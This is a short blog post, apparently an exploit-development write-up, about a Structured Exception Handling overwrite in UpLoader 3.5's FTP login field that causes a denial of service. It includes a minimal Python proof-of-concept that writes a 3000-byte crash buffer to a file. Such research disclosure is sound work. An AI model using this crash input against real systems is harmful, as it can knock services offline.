---
layout: post
title: UpLoader 3.5 - 'FTP Login' Denial of Service (PoC + SEH Overwrite)
date: 2020-03-26 14:45:00
categories: posts
comments: false
en: true
---

# The Bug

Uploader! 3.5 suffers from a Structered Exception Handling Overwrite which ends up simply being a Denial of Service due the lack of a valid address.

## The Crash

### Initial PoC

```term
import struct

buffer = "A" * 1000 + "A" * 2000

f = open ("poc.txt", "w")
f.write(buffer)
f.close()
```
